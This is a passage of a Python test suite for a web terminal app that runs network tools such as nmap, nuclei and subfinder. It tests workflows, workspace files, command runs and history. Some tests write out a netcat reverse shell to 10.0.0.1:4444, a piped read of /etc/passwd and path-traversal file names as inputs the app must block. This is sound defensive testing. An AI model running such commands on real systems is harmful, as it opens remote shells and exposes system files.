        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
            enabled = json.loads(client.get("/workflows").data)

        disabled_titles = {item["title"] for item in disabled["items"]}
        enabled_by_title = {item["title"]: item for item in enabled["items"]}

        assert "Subdomain HTTP Triage" not in disabled_titles
        assert "Crawl And Scan" not in disabled_titles
        assert enabled_by_title["Subdomain HTTP Triage"]["steps"][0]["cmd"] == (
            "subfinder -d {{domain}} -silent -o subdomains.txt"
        )
        assert enabled_by_title["Crawl And Scan"]["steps"][2]["cmd"] == (
            "nuclei -l crawled-urls.txt -severity high,critical -o nuclei-findings.txt"
        )

    def test_user_workflows_are_returned_before_builtins(self):
        client = get_client()
        session_id = "workflow-route-" + __import__("uuid").uuid4().hex[:8]
        resp = client.post(
            "/session/workflows",
            headers={"X-Session-ID": session_id},
            json={
                "title": "Saved DNS",
                "description": "custom sequence",
                "inputs": [
                    {
                        "id": "domain",
                        "label": "Domain",
                        "type": "domain",
                        "required": True,
                        "placeholder": "example.com",
                        "default": "",
                        "help": "",
                    },
                ],
                "steps": [{"cmd": "dig {{domain}} A", "note": "resolve apex"}],
            },
        )
        assert resp.status_code == 201

        data = json.loads(client.get("/workflows", headers={"X-Session-ID": session_id}).data)

        assert data["items"][0]["title"] == "Saved DNS"
        assert data["items"][0]["source"] == "user"
        assert data["items"][1]["source"] == "builtin"


# ── /shortcuts ────────────────────────────────────────────────────────────────

class TestShortcutsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/shortcuts")
        assert resp.status_code == 200

    def test_payload_shape(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        assert isinstance(data.get("sections"), list)
        assert data["sections"], "shortcuts payload should not be empty"
        for section in data["sections"]:
            assert isinstance(section, dict)
            assert isinstance(section.get("title"), str) and section["title"]
            assert isinstance(section.get("items"), list) and section["items"]
            for item in section["items"]:
                assert isinstance(item, dict)
                assert "key" in item and "description" in item
        assert isinstance(data.get("note", ""), str)

    def test_sections_cover_terminal_tabs_and_ui(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        titles = [section.get("title") for section in data["sections"]]
        assert titles == ["Terminal", "Tabs", "UI"]

    def test_includes_question_mark_self_reference(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        keys = [item.get("key") for section in data["sections"] for item in section["items"]]
        assert "?" in keys, "shortcuts overlay trigger should be self-documenting"

    def test_matches_shortcuts_builtin_source(self):
        from fake_commands import get_current_shortcuts
        direct = get_current_shortcuts(is_mac=False)
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        assert data["sections"] == direct["sections"]

    def test_non_mac_user_agent_renders_alt_prefix(self):
        client = get_client()
        client.environ_base["HTTP_USER_AGENT"] = (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        data = json.loads(client.get("/shortcuts").data)
        keys = [item["key"] for section in data["sections"] for item in section["items"]]
        assert "Alt+T" in keys
        assert "Alt+Shift+C" in keys
        assert not any(key.startswith("Option+") for key in keys)

    def test_mac_user_agent_renders_option_prefix(self):
        client = get_client()
        client.environ_base["HTTP_USER_AGENT"] = (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
        )
        data = json.loads(client.get("/shortcuts").data)
        keys = [item["key"] for section in data["sections"] for item in section["items"]]
        assert "Option+T" in keys
        assert "Option+Shift+C" in keys
        assert not any(key.startswith("Alt+") for key in keys)


# ── /welcome/ascii ───────────────────────────────────────────────────────────

class TestWelcomeAsciiRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert resp.status_code == 200

    def test_contains_banner_art(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert b"/$$" in resp.data


class TestWelcomeAsciiMobileRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.status_code == 200

    def test_returns_plain_text_banner(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.mimetype == "text/plain"
        assert resp.data


# ── /welcome/hints ───────────────────────────────────────────────────────────

class TestWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints").data)
        assert "items" in data
        assert isinstance(data["items"], list)


class TestMobileWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints-mobile")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints-mobile").data)
        assert "items" in data
        assert isinstance(data["items"], list)


# ── /workspace/files ──────────────────────────────────────────────────────────

class TestWorkspaceRoutes:
    def _cfg(self, root, **overrides):
        cfg = {
            "workspace_enabled": True,
            "workspace_backend": "tmpfs",
            "workspace_root": str(root),
            "workspace_quota_mb": 1,
            "workspace_max_file_mb": 1,
            "workspace_max_files": 10,
            "workspace_inactivity_ttl_hours": 1,
        }
        cfg.update(overrides)
        return cfg

    def test_requires_active_session_header(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            resp = client.get("/workspace/files")
        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "Files require an active session"

    def test_disabled_workspace_returns_403(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
            config.CFG,
            self._cfg(tmp, workspace_enabled=False),
        ):
            resp = client.get("/workspace/files", headers={"X-Session-ID": "workspace-disabled"})
        assert resp.status_code == 403
        assert json.loads(resp.data)["error"] == "Files are disabled on this instance"

    def test_write_list_read_delete_lifecycle(self):
        client = get_client()
        session = "workspace-lifecycle-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": "darklab.sh\n"},
            )
            assert created.status_code == 200
            created_data = json.loads(created.data)
            assert created_data["file"] == {"path": "targets.txt", "size": 11}
            assert created_data["workspace"]["usage"]["bytes_used"] == 11

            listed = json.loads(client.get("/workspace/files", headers={"X-Session-ID": session}).data)
            assert listed["files"][0]["path"] == "targets.txt"
            assert listed["limits"]["max_files"] == 10

            read = client.get(
                "/workspace/files/read?path=targets.txt",
                headers={"X-Session-ID": session},
            )
            assert json.loads(read.data) == {
                "path": "targets.txt",
                "text": "darklab.sh\n",
                "size": 11,
            }

            binary_path = resolve_workspace_path(session, "asset.db", config.CFG, ensure_parent=True)
            binary_path.write_bytes(b"SQLite format 3\x00binary")
            binary = client.get(
                "/workspace/files/read?path=asset.db",
                headers={"X-Session-ID": session},
            )
            assert binary.status_code == 415
            assert "download it instead" in json.loads(binary.data)["error"]

            deleted = client.delete(
                "/workspace/files?path=targets.txt",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            deleted_files = json.loads(deleted.data)["workspace"]["files"]
            assert "targets.txt" not in {item["path"] for item in deleted_files}

    def test_workspace_files_are_session_isolated(self):
        client = get_client()
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            resp = client.post(
                "/workspace/files",
                headers={"X-Session-ID": "workspace-owner"},
                json={"path": "targets.txt", "text": "owned\n"},
            )
            assert resp.status_code == 200

            other = client.get(
                "/workspace/files/read?path=targets.txt",
                headers={"X-Session-ID": "workspace-other"},
            )
            assert other.status_code == 404

    def test_create_directory_lists_empty_folder(self):
        client = get_client()
        session = "workspace-dir-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/directories",
                headers={"X-Session-ID": session},
                json={"path": "reports/empty"},
            )
            assert created.status_code == 200
            created_data = created.get_json()
            assert created_data["directory"] == {"path": "reports/empty"}
            assert {"reports", "reports/empty"} <= {
                item["path"] for item in created_data["workspace"]["directories"]
            }
            assert created_data["workspace"]["usage"]["file_count"] == 0

            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            assert listed.status_code == 200
            assert "reports/empty" in {item["path"] for item in listed.get_json()["directories"]}

    def test_info_and_delete_folder_recursively(self):
        client = get_client()
        session = "workspace-delete-dir-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/one.txt", "text": "one\n"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/nested/two.txt", "text": "two\n"},
            )

            info = client.get(
                "/workspace/files/info?path=reports",
                headers={"X-Session-ID": session},
            )
            assert info.status_code == 200
            assert info.get_json() == {"path": "reports", "kind": "directory", "file_count": 2}

            deleted = client.delete(
                "/workspace/files?path=reports",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            data = deleted.get_json()
            assert data["deleted"] == {"path": "reports", "kind": "directory", "file_count": 2}
            assert data["workspace"]["files"] == []
            assert data["workspace"]["directories"] == []

    def test_rejects_unsafe_paths(self):
        client = get_client()
        session = "workspace-paths-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            for bad_path in ("../escape.txt", "/tmp/escape.txt", "a\\b.txt"):
                resp = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": session},
                    json={"path": bad_path, "text": "x"},
                )
                assert resp.status_code == 400
                directory = client.post(
                    "/workspace/directories",
                    headers={"X-Session-ID": session},
                    json={"path": bad_path},
                )
                assert directory.status_code == 400

    def test_rejects_unsafe_paths_on_read_delete_and_download(self):
        client = get_client()
        session = "workspace-route-paths-" + uuid.uuid4().hex[:8]
        bad_paths = ("../escape.txt", "/tmp/escape.txt", "a\\b.txt")
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            for bad_path in bad_paths:
                encoded = quote(bad_path, safe="")
                read = client.get(
                    f"/workspace/files/read?path={encoded}",
                    headers={"X-Session-ID": session},
                )
                deleted = client.delete(
                    f"/workspace/files?path={encoded}",
                    headers={"X-Session-ID": session},
                )
                downloaded = client.get(
                    f"/workspace/files/download?path={encoded}",
                    headers={"X-Session-ID": session},
                )

                assert read.status_code == 400
                assert deleted.status_code == 400
                assert downloaded.status_code == 400

    def test_allows_hidden_workspace_paths_when_listed(self):
        client = get_client()
        session = "workspace-hidden-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": ".config/amass.txt", "text": "hidden ok\n"},
            )
            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            read = client.get(
                "/workspace/files/read?path=.config%2Famass.txt",
                headers={"X-Session-ID": session},
            )

            assert created.status_code == 200
            assert listed.status_code == 200
            assert ".config/amass.txt" in {item["path"] for item in listed.get_json()["files"]}
            assert read.status_code == 200
            assert read.get_json()["text"] == "hidden ok\n"

    def test_enforces_quota_and_type_checks(self):
        client = get_client()
        session = "workspace-quota-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
            config.CFG,
            self._cfg(tmp, workspace_quota_mb=0, workspace_max_file_mb=0, workspace_max_files=1),
        ):
            non_object = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                data="not-json",
                content_type="text/plain",
            )
            assert non_object.status_code == 400

            non_text = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": ["darklab.sh"]},
            )
            assert non_text.status_code == 400
            assert json.loads(non_text.data)["error"] == "text must be a string"

            too_big = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": "x"},
            )
            assert too_big.status_code == 413

    def test_download_streams_session_owned_file(self):
        client = get_client()
        session = "workspace-download-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "notes/targets.txt", "text": "darklab.sh\n"},
            )
            resp = client.get(
                "/workspace/files/download?path=notes/targets.txt",
                headers={"X-Session-ID": session},
            )
        assert resp.status_code == 200
        assert resp.get_data(as_text=True) == "darklab.sh\n"
        assert "attachment" in resp.headers["Content-Disposition"]
        assert "targets.txt" in resp.headers["Content-Disposition"]

    def test_periodic_cleanup_runs_before_requests_when_workspace_enabled(self):
        client = get_client()
        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
        try:
            shell_app._last_workspace_cleanup_monotonic = 0
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                from workspace import ensure_session_workspace
                expired_root = ensure_session_workspace("expired-session", config.CFG)
                os.utime(expired_root, (1000, 1000))

                with mock.patch("app.time.monotonic", return_value=1000):
                    resp = client.get("/health")

                assert resp.status_code == 200
                assert not expired_root.exists()
        finally:
            shell_app._last_workspace_cleanup_monotonic = previous_cleanup

    def test_periodic_cleanup_skips_request_session_workspace(self):
        client = get_client()
        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
        try:
            shell_app._last_workspace_cleanup_monotonic = 0
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                from workspace import ensure_session_workspace
                current_root = ensure_session_workspace("active-session", config.CFG)
                expired_root = ensure_session_workspace("expired-session", config.CFG)
                os.utime(current_root, (1000, 1000))
                os.utime(expired_root, (1000, 1000))

                with mock.patch("app.time.monotonic", return_value=1000):
                    resp = client.get("/health", headers={"X-Session-ID": "active-session"})

                assert resp.status_code == 200
                assert current_root.exists()
                assert not expired_root.exists()
        finally:
            shell_app._last_workspace_cleanup_monotonic = previous_cleanup


# ── /runs ─────────────────────────────────────────────────────────────────────

class TestRunRoute:
    def test_brokered_run_requires_available_broker(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=False), \
             mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"):
            resp = client.post("/runs", json={"command": "echo hi"})
        assert resp.status_code == 503
        assert json.loads(resp.data)["error"] == "broker unavailable"

    def test_brokered_run_missing_runtime_returns_synthetic_stream_reference(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
             mock.patch("blueprints.run._brokered_synthetic_run", return_value="run-missing") as synthetic, \
             mock.patch("blueprints.run.subprocess.Popen") as popen:
            resp = client.post(
                "/runs",
                json={"command": "nmap -sV darklab.sh"},
                headers={"X-Session-ID": "session-1"},
            )
        assert resp.status_code == 202
        assert json.loads(resp.data) == {
            "run_id": "run-missing",
            "stream": "/runs/run-missing/stream",
        }
        synthetic.assert_called_once()
        args = synthetic.call_args.args
        assert args[0] == "nmap -sV darklab.sh"
        assert args[3] == [{"type": "output", "text": "Command is not installed on this instance: nmap"}]
        assert args[4] == 127
        assert synthetic.call_args.kwargs == {"cmd_type": "missing"}
        popen.assert_not_called()

    def test_brokered_run_rejects_invalid_command_payloads(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True):
            non_object = client.post("/runs", json=["hostname"])
            missing = client.post("/runs", json={})
            non_string = client.post("/runs", json={"command": 42})
            blank = client.post("/runs", json={"command": "   "})

        assert non_object.status_code == 400
        assert json.loads(non_object.data) == {"error": "Request body must be a JSON object"}
        assert missing.status_code == 400
        assert json.loads(missing.data) == {"error": "No command provided"}
        assert non_string.status_code == 400
        assert json.loads(non_string.data) == {"error": "Command must be a string"}
        assert blank.status_code == 400
        assert json.loads(blank.data) == {"error": "No command provided"}

    def test_brokered_run_disallowed_command_returns_403_before_spawning(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")), \
             mock.patch("blueprints.run.subprocess.Popen") as popen:
            resp = client.post("/runs", json={"command": "nmap -sS 127.0.0.1"})

        assert resp.status_code == 403
        assert json.loads(resp.data) == {"error": "blocked"}
        popen.assert_not_called()

    def test_brokered_run_starts_real_process_and_registers_active_run(self):
        client = get_client()
        fake_proc = _RouteFakeProc(pid=8765)
        _CapturedThread.instances = []

        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
             mock.patch("blueprints.run.rewrite_command", return_value=("ping darklab.sh", "rewritten")), \
             mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
             mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
             mock.patch("blueprints.run.pid_register") as pid_register, \
             mock.patch("blueprints.run.active_run_register") as active_register, \
             mock.patch("blueprints.run.publish_run_event") as publish, \
             mock.patch("blueprints.run.threading", mock.Mock(Thread=_CapturedThread)), \
             mock.patch("blueprints.run.uuid.uuid4", return_value="run-real"):
            resp = client.post(
                "/runs",
                json={"command": "ping darklab.sh", "tab_id": "tab-1"},
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 202
        assert json.loads(resp.data) == {
            "run_id": "run-real",
            "stream": "/runs/run-real/stream",
        }
        launched = popen.call_args.args[0]
        assert launched[-2:] == ["-c", "ping darklab.sh"]
        pid_register.assert_called_once_with("run-real", 8765)
        active_register.assert_called_once()
        assert active_register.call_args.args[:4] == (
            "run-real",
            8765,
            "session-1",
            "ping darklab.sh",
        )
        assert active_register.call_args.kwargs == {
            "owner_client_id": "client-1",
            "owner_tab_id": "tab-1",
        }
        publish.assert_called_once()
        assert publish.call_args.args[:2] == ("run-real", "started")
        assert publish.call_args.args[2]["run_id"] == "run-real"
        assert len(_CapturedThread.instances) == 1
        thread = _CapturedThread.instances[0]
        assert thread.started is True
        assert thread.daemon is True
        assert thread.name == "run-broker-run-real"
        assert thread.kwargs["run_id"] == "run-real"
        assert thread.kwargs["proc"] is fake_proc
        assert thread.kwargs["session_id"] == "session-1"
        assert thread.kwargs["original_command"] == "ping darklab.sh"
        assert thread.kwargs["rewrite_notice"] == "rewritten"

    def test_brokered_run_events_returns_session_scoped_backfill(self):
        client = get_client()
        fake_event = mock.Mock(event_id="10-0", payload={"type": "output", "text": "hello"})
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as get_events:
            resp = client.get(
                "/runs/run-1/events?after=9-0&limit=25",
                headers={"X-Session-ID": "session-1"},
            )
        assert resp.status_code == 200
        assert json.loads(resp.data) == {
            "run_id": "run-1",
            "events": [{"event_id": "10-0", "type": "output", "text": "hello"}],
        }
        get_events.assert_called_once_with("run-1", after_id="9-0", limit=25)

    def test_brokered_run_events_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
             mock.patch("blueprints.run.get_run_events") as get_events:
            resp = client.get(
                "/runs/run-other/events",
                headers={"X-Session-ID": "session-1"},
            )

        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "Run not found"}
        get_events.assert_not_called()

    def test_brokered_run_stream_replays_events_for_session_run(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: one\n\n"])), \
             mock.patch("blueprints.run.active_run_touch_owner") as touch:
            resp = client.get(
                "/runs/run-1/stream?after=9-0&tab_id=tab-1",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )
            body = resp.get_data(as_text=True)
        assert resp.status_code == 200
        assert body == "data: one\n\n"
        touch.assert_called_once_with("run-1", "client-1", "tab-1")

    def test_brokered_run_stream_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
             mock.patch("blueprints.run.stream_run_events") as stream_events:
            resp = client.get(
                "/runs/run-other/stream",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "Run not found"}
        stream_events.assert_not_called()

    def test_brokered_run_owner_takeover_route_is_retired(self):
        client = get_client()
        resp = client.post(
            "/runs/run-1/owner",
            headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
            json={"tab_id": "tab-2"},
        )
        assert resp.status_code == 404

    def test_kill_allows_same_session_attached_client_and_publishes_killer(self):
        client = get_client()
        with mock.patch("blueprints.run.pid_pop_for_session", return_value=4321) as pop_pid, \
             mock.patch("blueprints.run.publish_run_event") as publish, \
             mock.patch("blueprints.run.SCANNER_PREFIX", ""), \
             mock.patch("blueprints.run.os.killpg") as killpg:
            resp = client.post(
                "/kill",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
                json={"run_id": "run-1", "tab_id": "tab-2"},
            )
        assert resp.status_code == 200
        assert json.loads(resp.data) == {"killed": True}
        pop_pid.assert_called_once_with("run-1", "session-1")
        publish.assert_called_once_with("run-1", "killed", {
            "killer_client_id": "client-2",
            "killer_tab_id": "tab-2",
        })
        killpg.assert_called_once_with(4321, shell_app.signal.SIGTERM)

    def test_kill_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.pid_pop_for_session", return_value=None) as pop_pid, \
             mock.patch("blueprints.run.publish_run_event") as publish:
            resp = client.post(
                "/kill",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
                json={"run_id": "run-1"},
            )
        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "No such process"}
        pop_pid.assert_called_once_with("run-1", "session-1")
        publish.assert_not_called()

    def test_disallowed_command_returns_403(self):
        client = get_client()
        # Patch in commands' namespace — is_command_allowed calls load_command_policy
        # from commands' own namespace, not from app's.
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
            resp = client.post("/runs", json={"command": "nc -e /bin/sh 10.0.0.1 4444"})
        assert resp.status_code == 403

    def test_shell_operator_returns_403(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("commands.load_command_policy", return_value=(["ping"], [])):
            resp = client.post("/runs", json={"command": "ping google.com | cat /etc/passwd"})
        assert resp.status_code == 403

    def test_non_json_body_handled(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True):
            resp = client.post("/runs", data="not json", content_type="text/plain")
        # Should not crash — Flask returns 400 or 415 for bad content type
        assert resp.status_code in (400, 415, 500)

    def test_client_side_run_persists_terminal_native_builtin(self):
        client = get_client()
        session = "client-run-" + uuid.uuid4().hex[:8]
        try:
            resp = client.post(
                "/run/client",
                headers={"X-Session-ID": session},
                json={
                    "command": "theme list",
                    "exit_code": 0,
                    "lines": [
                        {"text": "Available themes:", "cls": "fake-section"},
                        {"text": "Dark themes:", "cls": "fake-section"},
                    ],
                },
            )
            data = json.loads(resp.data)
            assert resp.status_code == 200
            assert data["ok"] is True
            assert data["output_line_count"] == 2

            history = json.loads(
                client.get(
                    "/history?type=runs&include_total=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert history["runs"][0]["command"] == "theme list"
            assert history["total_count"] == 1

            run_id = history["runs"][0]["id"]
            detail = json.loads(
                client.get(
                    f"/history/{run_id}?json&preview=1",
                    headers={"X-Session-ID": session},
                ).data
            )
            assert detail["command"] == "theme list"
            assert detail["output"] == ["Available themes:", "Dark themes:"]
        finally:
            conn = sqlite3.connect(DB_PATH)
            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
            conn.commit()
            conn.close()

    def test_client_side_run_rejects_non_client_builtin_root(self):
        client = get_client()
        resp = client.post(
            "/run/client",
            json={
                "command": "ping darklab.sh",
                "exit_code": 0,
                "lines": [],
            },
        )
        assert resp.status_code == 403


# ── /history ──────────────────────────────────────────────────────────────────

class TestHistoryRoute:
    def test_get_returns_200(self):
        client = get_client()
        resp = client.get("/history", headers={"X-Session-ID": "test-session"})
        assert resp.status_code == 200

    def test_get_returns_runs_list(self):
        client = get_client()
        data = json.loads(
            client.get("/history", headers={"X-Session-ID": "test-session"}).data
        )
        assert "items" in data
        assert isinstance(data["items"], list)
        assert "runs" in data
        assert isinstance(data["runs"], list)
        assert "roots" in data
        assert isinstance(data["roots"], list)

    def test_stats_returns_compact_session_counters(self):
        client = get_client()
        session = "history-stats-" + uuid.uuid4().hex[:8]
        run_ids = [f"{session}-ok", f"{session}-fail", f"{session}-terminated", f"{session}-active"]
        snapshot_id = f"{session}-snapshot"
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sT ip.darklab.sh", "2026-01-01T00:00:00",
                 "2026-01-01T00:00:10", 0, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "curl https://ip.darklab.sh", "2026-01-01T00:01:00",
                 "2026-01-01T00:01:20", 1, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "ping ip.darklab.sh", "2026-01-01T00:02:00",
                 "2026-01-01T00:02:15", -15, "[]"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
                "VALUES (?, ?, ?, ?, ?, ?, ?)",
                (run_ids[3], session, "sleep 60", "2026-01-01T00:03:00", None, None, "[]"),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, ?, ?)",
                (snapshot_id, session, "snap", "2026-01-01T00:03:00", "[]"),
            )
            conn.execute(
                "INSERT INTO starred_commands (session_id, command) VALUES (?, ?)",
                (session, "nmap -sT ip.darklab.sh"),
            )
            conn.commit()
            data = json.loads(client.get("/history/stats", headers={"X-Session-ID": session}).data)
            assert data["runs"]["total"] == 4
            assert data["runs"]["succeeded"] == 1
            assert data["runs"]["failed"] == 1
            assert data["runs"]["incomplete"] == 1
            assert abs(data["runs"]["average_elapsed_seconds"] - 15.0) < 0.01
            assert data["snapshots"] == 1
            assert data["starred_commands"] == 1
            assert isinstance(data["active_runs"], int)
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM runs WHERE id IN (?, ?, ?, ?)", run_ids)
                conn.execute("DELETE FROM snapshots WHERE id = ?", (snapshot_id,))
                conn.execute("DELETE FROM starred_commands WHERE session_id = ?", (session,))
                conn.commit()

    def test_insights_returns_visual_history_payloads(self):
        client = get_client()
        session = "history-insights-" + uuid.uuid4().hex[:8]
        run_ids = [
            f"{session}-nmap",
            f"{session}-curl",
            f"{session}-terminated",
            f"{session}-sleep",
            f"{session}-old",
        ]
        now = datetime.now(timezone.utc).replace(tzinfo=None, microsecond=0)
        day_sixty = (now - timedelta(days=60)).isoformat()
        day_ten = (now - timedelta(days=10)).isoformat()
        day_one = (now - timedelta(days=1)).isoformat()
        today = now.isoformat()
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[4], session, "whois old.darklab.sh", day_sixty,
                 (now - timedelta(days=60, seconds=-2)).isoformat(), 0, "[]", 1),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[0], session, "nmap -sT ip.darklab.sh", day_ten,
                 (now - timedelta(days=10, seconds=-10)).isoformat(), 0, "[]", 12),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[1], session, "curl https://ip.darklab.sh", day_one,
                 (now - timedelta(days=1, seconds=-5)).isoformat(), 1, "[]", 4),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[2], session, "ping ip.darklab.sh", day_one,
                 (now - timedelta(days=1, seconds=-15)).isoformat(), -15, "[]", 2),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (run_ids[3], session, "sleep 60", today, None, None, "[]", 0),
            )
            conn.commit()
            data = json.loads(client.get("/history/insights", headers={"X-Session-ID": session}).data)
            assert data["days"] == 61
            assert len(data["activity"]) == 61
            assert data["start_date"] == (now - timedelta(days=60)).date().isoformat()
            assert data["first_run_date"] == (now - timedelta(days=60)).date().isoformat()
            assert data["windows"]["activity"]["days"] == 61
            assert data["windows"]["command_mix"]["days"] == 90
            assert data["windows"]["constellation"]["days"] == 90
            assert data["windows"]["command_mix"]["sparse"] is True
            assert data["windows"]["constellation"]["sparse"] is True
            assert data["max_day_count"] >= 1
            roots = {item["root"]: item for item in data["command_mix"]}
